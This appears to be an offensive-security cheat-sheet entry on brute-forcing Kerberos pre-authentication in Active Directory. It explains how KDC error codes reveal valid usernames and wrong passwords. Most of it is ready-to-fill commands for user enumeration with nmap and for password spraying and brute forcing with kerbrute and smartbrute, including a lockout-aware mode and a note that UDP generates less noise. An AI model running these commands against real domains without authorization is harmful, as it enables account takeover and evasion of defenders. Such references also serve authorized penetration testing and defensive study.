---
technique: Pre-auth Bruteforce
category: kerberos
targets: Domain users
protocols: Kerberos
remote_capable: true
tags: kerberos pre-auth bruteforce password-spray user-enum lockout ad
---

# Pre-auth Bruteforce

Kerberos pre-authentication can be bruteforced directly by sending AS-REQ messages and inspecting error codes: `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` means the user does not exist; `KRB5KDC_ERR_PREAUTH_FAILED` means the user exists but the password is wrong; a valid TGT means success. This approach is faster and generates less noise than NTLM-based sprays, especially when UDP is used as the transport protocol.

## Linux

### nmap (user enum)

#nmap #user-enum #kerberos

Enumerate valid domain usernames by testing them against the Kerberos service.

```sh title:"Enumerate valid domain users via Kerberos AS-REQ"
nmap -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='$domain',userdb=$users_file" "$rhost_ip"
```
<!-- cheat
import domain_ip
var users_file
-->

### kerbrute

#go #bruteforce #password-spray

Bruteforce or spray passwords against Kerberos pre-authentication with kerbrute.

```sh title:"Password spray against Kerberos pre-auth with kerbrute"
kerbrute passwordspray -d "$domain" --dc "$rhost_ip" "$users_file" "$pass"
```
<!-- cheat
import domain_ip
import passwords
var users_file
-->

### smartbrute (brute mode)

#python #bruteforce

Bruteforce Kerberos pre-authentication with a user list and password list.

```sh title:"Bruteforce Kerberos pre-auth with user and password lists"
smartbrute.py brute -bU "$user_list" -bP "$pass_list" kerberos -d "$domain"
```
<!-- cheat
import domain_ip
var user_list
var pass_list
-->

### smartbrute (smart mode)

#python #smart-spray #lockout-aware

Spray passwords via Kerberos pre-auth with LDAP-backed enumeration to avoid account lockouts.

```sh title:"Lockout-aware Kerberos spray using LDAP for user enumeration"
smartbrute.py smart -bP "$pass_list" ntlm -d "$domain" -u "$user" -p "$pass" kerberos
```
<!-- cheat
import domain_ip
import users
import passwords
var pass_list
-->
